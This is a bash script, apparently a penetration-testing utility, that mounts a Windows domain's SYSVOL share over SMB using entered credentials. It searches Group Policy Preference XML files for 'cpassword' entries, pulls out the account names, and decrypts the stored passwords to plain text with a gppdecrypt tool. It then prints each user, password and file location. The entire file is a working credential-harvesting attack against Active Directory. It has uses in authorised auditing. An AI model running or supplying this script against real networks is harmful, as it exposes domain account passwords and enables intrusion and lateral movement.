#!/bin/bash
#colours
	red=`echo -e "\033[31m"`
	lcyan=`echo -e "\033[36m"`
	yellow=`echo -e "\033[33m"`
	green=`echo -e "\033[32m"`
	blue=`echo -e "\033[34m"`
	purple=`echo -e "\033[35m"`
	normal=`echo -e "\033[m"`

#variables
	gppdecrypt_path="/root/Desktop/Tools"


#smb connect
	echo -n "$yellow host:$normal "
	read host
	echo -n "$yellow user:$normal "
	read user
	echo -n "$yellow pass:$normal "
	read pass
	mkdir -p /mnt/$host
	mount -t cifs //$host/sysvol /mnt/$host -o user=$user,password=$pass
	echo ""

#find cpass files in mounted directory
	find /mnt/$host -type f -name '*.xml' | xargs grep "cpass" > /tmp/cpass
	echo "$yellow ------------------------------------------"
	echo "$green `cat /tmp/cpass| wc -l` $normal cpass entries found"
	echo "$yellow ------------------------------------------$normal"
	echo ""

#while loop and file manipulation
while read line; do

			if 
				echo $line|  grep -q ScheduledTasks 
			then 
				echo -n "$yellow User:$normal "
				echo "$line" | grep -Po 'accountName=".*?"'  | cut -d \" -f 2 | cut -d \\ -f 1
				
			elif
				echo $line|  grep -q Groups
			then
				echo -n "$yellow User:$normal "
				echo "$line" | grep -Po 'userName=".*?"'  | cut -d \" -f 2 | cut -d \\ -f 1
			elif 
				echo $line|  grep -q DataSources
			then
				echo -n "$yellow User:$normal "
				echo "$line" | grep -Po 'username=".*?"'  | cut -d \" -f 2 | cut -d \\ -f 1
			elif 
				echo $line|  grep -q ScheduledTasks 
			then 
				echo -n "$yellow User:$normal "
				echo "$line" | grep -Po 'accountName=".*?"'  | cut -d \" -f 2 | cut -d \\ -f 1
			fi

	echo -n "$yellow Pass:$normal "
	echo -n $line | grep -Po 'cpassword=".*?"'  | cut -d \" -f 2 > /tmp/cpass.cracked
	cat /tmp/cpass.cracked

	
	echo -n "$lcyan Plain Text: $normal"
	ruby $gppdecrypt_path/gppdecrypt.rb `cat /tmp/cpass.cracked` 


	# echo -n "$yellow Service:$normal "
	# echo $line | grep -Po 'serviceName=".*?"'  | cut -d \" -f 2 

	echo -n "$yellow Location:$normal " 
	echo $line | cut -d \: -f 1

	echo "$yellow ------------------------------------------"

done < /tmp/cpass

#cleanup
	umount /mnt/$host
	rm -rf /mnt/$host
	#rm /tmp/cpass

